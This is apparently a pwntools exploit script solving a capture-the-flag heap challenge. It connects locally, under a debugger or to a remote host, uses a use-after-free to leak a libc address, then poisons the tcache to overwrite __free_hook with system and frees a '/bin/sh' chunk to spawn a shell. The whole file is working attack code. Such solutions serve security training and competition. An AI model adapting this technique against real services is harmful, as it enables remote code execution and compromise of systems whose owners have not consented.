#!/usr/bin/env python3
from pwn import *
import sys

elf = context.binary = ELF("./chall", checksec=True)
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")
#context.log_level = "debug"

#tmx
context.terminal = ["tmux", "splitw", "-h"]

def start(argv=[], *a, **kw):
    if args.R:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.GDB:
        return gdb.debug(elf.path, gdbscript=gdbscript, *a, **kw)
    else:
        return process(elf.path, *a, **kw)

gdbscript = """
continue
"""
r = start()
def rcu(d1, d2=0):
  r.recvuntil(d1, drop=True)
  if (d2):
    return r.recvuntil(d2,drop=True)
libcbase = lambda: log.info("libc base = %#x" % libc.address)
logleak = lambda name, val: log.info(name+" = %#x" % val)
sa = lambda delim, data: r.sendafter(delim, data)
sla = lambda delim, line: r.sendlineafter(delim, line)
sl = lambda line: r.sendline(line)
bc = lambda value: str(value).encode('ascii')
demangle_base = lambda value: value << 0xc
remangle = lambda heap_base, value: (heap_base >> 0xc) ^ value

# ---------xploit------------

def malloc(index, size, content):
    sla(b">", b"1")
    sla(b"Index (0-9): ", str(index).encode())
    sla(b"Size: ", str(size).encode())
    sla(b"Content: ", content)

def free(index):
    sla(b">", b"2")
    sla(b"Index: ", str(index).encode())

def uafread(index):
    sla(b">", b"3")
    sla(b"Index: ", str(index).encode())

def uafwrite(index, content):
    sla(b">", b"4")
    sla(b"Index:", str(index).encode())
    sla(b"New Content:", content)

# leak libc
malloc(0, 0x420, b"leaker") #chunk too long for the tcache range
malloc(1, 0x20, b"GUARD")
free(0)
uafread(0)
rcu(b"Data: ")
leak_fd = u64(r.recvline()[:8].ljust(8, b"\x00"))
logleak("fd pointer leak -> ", leak_fd)
libc.address = leak_fd - 96 - 0x10 - libc.sym.__malloc_hook
libcbase()

#Tcache Poisoning: creates 2 chunks with the same size -> frees chunk 2, chunk 1 -> uses UAF Write to overwrite the fd pointer to the address of __free_hook -> recycles the first chunk and writes /bin/sh and then the second chunk to write system in __free_hook

malloc(2, 0x58, b"victim")
malloc(3, 0x58, b"safe")

free(3)
free(2)

uafwrite(2, p64(libc.sym.__free_hook)) # overwrite fd with __free_hook
malloc(4, 0x58, b"/bin/sh\x00")
malloc(5, 0x58, p64(libc.sym.system)) # write system in __free_hook
free(4) # system(/bin/sh)

# --------interactive--------
r.interactive()
